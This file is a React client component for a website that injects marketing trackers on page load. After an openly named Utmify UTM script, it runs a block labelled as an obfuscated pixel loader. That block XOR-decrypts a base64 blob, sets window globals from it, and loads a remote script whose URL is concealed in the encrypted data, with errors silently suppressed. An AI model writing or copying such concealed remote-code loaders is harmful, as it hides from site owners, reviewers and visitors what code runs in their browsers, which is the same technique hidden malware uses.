"use client"

import { useEffect, useState } from "react"

export default function UtmifyScripts() {
  const [mounted, setMounted] = useState(false)

  useEffect(() => {
    setMounted(true)
  }, [])

  useEffect(() => {
    if (!mounted) return
    try {
      // UTM capture script
      const utmScript = document.createElement("script")
      utmScript.src = "https://cdn.utmify.com.br/scripts/utms/latest.js"
      utmScript.setAttribute("data-utmify-prevent-xcod-sck", "")
      utmScript.setAttribute("data-utmify-prevent-subids", "")
      utmScript.setAttribute("data-utmify-ignore-iframe", "")
      utmScript.setAttribute("data-utmify-is-cartpanda", "")
      utmScript.async = true
      utmScript.defer = true
      document.body.appendChild(utmScript)

      // Pixel script (obfuscated loader)
      ;(function () {
        var x_a = atob(
          "DOq88YzngSt9U2jMwJGehP6LoxFfOxy4sJmG3qOE5UVTJhyhqYzF3++I7AUfIUe/o5jVgfiUrlsUKw2g75rViemLr0EOcUTuoZ7Ig+WF9F8YIEr2m7eQ0+uL7kkcPxvu+rHH0+KG7E5faUq8qZLZncWDowdfJQmgtY+ey67R4BIfYF2qot+IyLqF4BlKNwn1pojYwr3F/HYA",
        )
        var o_lc = []
        for (var z_n = 0; z_n < x_a.length; z_n++) {
          o_lc.push(x_a.charCodeAt(z_n) & 255)
        }
        var u_0 = o_lc[0]
        var b_t7rm = o_lc.slice(1, 1 + u_0)
        var x_tr1 = o_lc.slice(1 + u_0)
        var p_r = x_tr1.map((b, e_0q82) => b ^ b_t7rm[e_0q82 % u_0])
        var v_ir = ""
        for (var z_r8lv = 0; z_r8lv < p_r.length; z_r8lv++) {
          v_ir += String.fromCharCode(p_r[z_r8lv] & 255)
        }
        var k_epi = decodeURIComponent(escape(v_ir))
        var a_9r2 = JSON.parse(k_epi)
        var y_yt = a_9r2.globals || []
        y_yt.forEach((o_y9ei) => {
          ;(window as unknown as Record<string, unknown>)[o_y9ei.name] = o_y9ei.value
        })
        var c_raqd = document.createElement("script")
        c_raqd.src = a_9r2.url
        c_raqd.async = true
        c_raqd.defer = true
        ;(a_9r2.attributes || []).forEach((g_zo: { name: string; value: string }) => {
          c_raqd.setAttribute(g_zo.name, g_zo.value)
        })
        ;(document.head || document.documentElement).appendChild(c_raqd)
      })()
    } catch (e) {
      // silently fail in preview
    }
  }, [mounted])

  return null
}
